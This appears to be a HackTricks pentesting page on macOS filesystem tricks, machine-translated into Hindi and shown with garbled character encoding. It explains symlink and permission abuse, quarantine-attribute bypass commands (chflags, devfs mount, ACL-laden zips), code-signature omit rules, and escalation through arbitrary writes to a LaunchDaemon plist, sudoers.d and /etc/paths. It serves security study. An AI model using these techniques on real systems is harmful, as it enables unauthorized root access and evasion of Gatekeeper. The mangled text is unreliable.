# macOS FS рдЯреНрд░рд┐рдХреНрд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рдФрд░ **hacktricks рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks) рдФрд░ **hacktricks-cloud рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## POSIX рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рдВрдпреЛрдЬрди

**рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА** рдореЗрдВ рдЕрдиреБрдорддрд┐рдпрд╛рдБ:

* **рдкрдврд╝рдирд╛** - рдЖрдк рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреА **рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ** рд╣реИрдВ
* **рд▓рд┐рдЦрдирд╛** - рдЖрдк рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ **рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдЯрд╛ рд╕рдХрддреЗ/рд▓рд┐рдЦ рд╕рдХрддреЗ** рд╣реИрдВ
* **рдЪрд▓рд╛рдирд╛** - рдЖрдкрдХреЛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ **рддрд░реНрд╡рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ - рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдпрд╣ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕рдореЗрдВ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдЙрдк-рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рдЦрддрд░рдирд╛рдХ рд╕рдВрдпреЛрдЬрди

**рдХреИрд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓/рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ**, рд▓реЗрдХрд┐рди:

* рдкрде рдореЗрдВ рдПрдХ рдорд╛рддрд╛-рдкрд┐рддрд╛ **рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдорд╛рд▓рд┐рдХ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ
* рдкрде рдореЗрдВ рдПрдХ рдорд╛рддрд╛-рдкрд┐рддрд╛ **рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдорд╛рд▓рд┐рдХ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдореВрд╣ рд╣реИ рдЬрд┐рд╕рдХреЗ **рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░** рд╣реИ
* рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдореВрд╣ рдХреЛ **рдлрд╝рд╛рдЗрд▓** рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдХреА** рдЕрдиреБрдорддрд┐ рд╣реИ

рдкрд┐рдЫрд▓реЗ рдХрд┐рд╕реА рднреА рд╕рдВрдпреЛрдЬрди рдХреЗ рд╕рд╛рде, рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдПрдХ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рддрд╛ рдЕрдирд┐рд╢реНрдЪрд┐рдд рд▓рд┐рдЦрдиреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкрде рдореЗрдВ рдПрдХ **рд╕рд┐рдо/рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ** рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред

### рдлрд╝реЛрд▓реНрдбрд░ рд░реВрдЯ R+X рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓рд╛

рдпрджрд┐ рдХрд┐рд╕реА **рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА** рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд╣рд╛рдВ **рдХреЗрд╡рд▓ рд░реВрдЯ рдХреЛ R+X рдПрдХреНрд╕реЗрд╕** рд╣реИ, рддреЛ рд╡реЗ **рдХрд┐рд╕реА рдФрд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд┐рд╕реА рд╡рд┐рдХрд░реНрд╖рдг рдХреЛ рдЕрдиреБрдорддрд┐ рдХреЗ рдХрд╛рд░рдг рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдПрдХ рдЕрд▓рдЧ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ** рдореВрд╡ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ / рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ

рдпрджрд┐ рдПрдХ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ **рдлрд╝рд╛рдЗрд▓** рдореЗрдВ рдбреЗрдЯрд╛ рд▓рд┐рдЦ рд░рд╣реА рд╣реИ рдЬрд┐рд╕реЗ рдПрдХ **рдирд┐рдореНрдирд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рдЬрд┐рд╕реЗ рдПрдХ рдирд┐рдореНрдирд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **рдкрд╣рд▓реЗ рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрд╕ рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рдпрд╛ рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рджреВрд╕рд░реА рдлрд╝рд╛рдЗрд▓ рдкрд░ **рдкреЙрдЗрдВрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦреЗрдЧреАред

рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдПрдХ рдЕрдирд┐рд╢реНрдЪрд┐рдд рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдХрд╣рд╛рдВ рдЕрдкрдиреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕реЗ рдЬрд╛рдВрдЪреЗрдВред

## рдЕрдирд┐рдпрдорд┐рдд FD

рдпрджрд┐ рдЖрдк рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдЦреЛрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **`crontab`** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ `/etc/sudoers.d` рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ **`EDITOR=exploit.py`** рдХреЗ рд╕рд╛рде рдЦреЛрд▓реЗрдВ, рдЗрд╕рд▓рд┐рдП `exploit.py` `/etc/sudoers` рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП FD рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред

рдЙрджрд╛рд╣рд░рдг: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди xattrs рдЯреНрд░рд┐рдХреНрд╕ рд╕реЗ рдмрдЪреЗрдВ

### рдЗрд╕реЗ рд╣рдЯрд╛рдПрдБ
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable рдлреНрд▓реИрдЧ

рдпрджрд┐ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ / рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдпрд╣ рдЕрд╡рд┐рдЪрд▓рдиреАрдп рдЧреБрдг рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рдкрд░ xattr рдирд╣реАрдВ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs рдорд╛рдЙрдВрдЯ

**devfs** рдорд╛рдЙрдВрдЯ **xattr рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛**, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) рдореЗрдВред
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### рд▓рд┐рдЦреЗрдВрдПрдХреНрд╕рдЯреНрд░реЗрдХреНрдЯреНрд░реЗрд╕ рдПрд╕реАрдПрд▓

рдпрд╣ рдПрд╕реАрдПрд▓ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `xattrs` рдХреЛ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА ACEs рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рддрд╛ рд╣реИред

[**рд╕реНрд░реЛрдд рдХреЛрдб**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ xattr рдХреЗ рднреАрддрд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд **`com.apple.acl.text`** рдирд╛рдордХ ACL рдкрд╛рда рдкреНрд░рддрд┐рд╖реНрдард╛рди рдХреЛ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ ACL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ zip рдлрд╝рд╛рдЗрд▓ рдореЗрдВ AppleDouble рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдХреЗ рд╕рд╛рде рд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ ACL рд╣реИ рдЬреЛ рдЕрдиреНрдп xattr рдХреЛ рдЗрд╕рдореЗрдВ рд▓рд┐рдЦрдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ... рддреЛ quarantine xattr рдХреЛ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

рдЗрд╕реЗ рдкреНрд░рддрд┐рд░реВрдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рд╣рдореЗрдВ рд╕рд╣реА acl рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреА рд╣реЛрдЧреА:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди рдореИрдВ рдЗрд╕реЗ рд╡рд╣рд╛рдВ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реВрдВ рдмрд╕ рдЗрд╕рдХреЗ рд▓рд┐рдП:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## рдХреЛрдб рд╕рд╛рдЗрдиреЗрдЪрд░ рдХреЛ рдЫреЛрдбрд╝реЗрдВ

рдмрдВрдбрд▓ рдореЗрдВ рдлрд╝рд╛рдЗрд▓ **`_CodeSignature/CodeResources`** рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдмрдВрдбрд▓ рдореЗрдВ рд╣рд░ рдПрдХ **рдлрд╝рд╛рдЗрд▓** рдХрд╛ **рд╣реИрд╢** рд╣реЛрддрд╛ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ CodeResources рдХрд╛ рд╣реИрд╢ рднреА **executable рдореЗрдВ рд╕рдорд╛рд╣рд┐рдд** рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЙрд╕рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рдРрд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдирдХреЗ рд╕рд╛рдЗрдиреЗрдЪрд░ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рдПрдЧреА, рдЗрдирдореЗрдВ plist рдореЗрдВ рдЪрд╛рдмреА рдЫреЛрдбрд╝реА рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк CLI рд╕реЗ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## рдбреАрдПрдордЬреА рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ

рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдХрд╕реНрдЯрдо рдбреАрдПрдордЬреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рдХреБрдЫ рдореМрдЬреВрджрд╛ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреЗ рдКрдкрд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣рд╛рдВ рдЖрдк рдХрд╕реНрдЯрдо рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ рдХрд╕реНрдЯрдо рдбреАрдПрдордЬреА рдкреИрдХреЗрдЬ рдХреИрд╕реЗ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## рдЕрдирд┐рдпрдорд┐рдд рд▓реЗрдЦрди

### рдирд┐рдпрдорд┐рдд рдПрд╕рдПрдЪ рд╕реНрдХреНрд░рд┐рдкреНрдЯ

рдпрджрд┐ рдЖрдкрдХрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ **рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЖрдк **`/etc/periodic/daily/999.local`** рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдкреНрд░рддрд┐рджрд┐рди рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛ред

рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдирдХрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ: **`sudo periodic daily`**

### рдбреЗрдорди

рдПрдХ рдЕрдирд┐рдпрдорд┐рдд **рд▓реЙрдиреНрдЪрдбреЗрдорди** рдЬреИрд╕реЗ **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** рдХреЛ рд▓рд┐рдЦреЗрдВ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдкреНрд▓рд┐рд╕реНрдЯ рд╣реИ рдЬреЛ рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
рдЖрдкрдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд╣рд┐рдП рд╡рд╣реА **рдХрдорд╛рдВрдб** рдЬреЛ рдЖрдк рдЪрд╛рд╣реЗрдВ рддреЛ `/Applications/Scripts/privesc.sh` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВред

### Sudoers рдлрд╝рд╛рдЗрд▓

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЕрдирд┐рдпрдорд┐рдд рд▓реЗрдЦрди** рд╣реИ, рддреЛ рдЖрдк `/etc/sudoers.d/` рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдкрдХреЛ **sudo** рдЕрдзрд┐рдХрд╛рд░ рдорд┐рд▓реЗрдВред

### PATH рдлрд╝рд╛рдЗрд▓реЗрдВ

рдлрд╝рд╛рдЗрд▓ **`/etc/paths`** PATH env рдЪрд░ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдореБрдЦреНрдп рдЬрдЧрд╣реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред рдЖрдкрдХреЛ рдЗрд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдпрджрд┐ рдХреЛрдИ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛** рд╕реЗ рдХреЛрдИ **рдкреВрд░рд╛ рдкрде рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдХрдорд╛рдВрдб** рдЪрд▓рд╛ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЗрд╕реЗ **рд╣рд╛рдЗрдЬреИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдирдП рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ `PATH` env рдЪрд░ рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`/etc/paths.d`** рдореЗрдВ рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

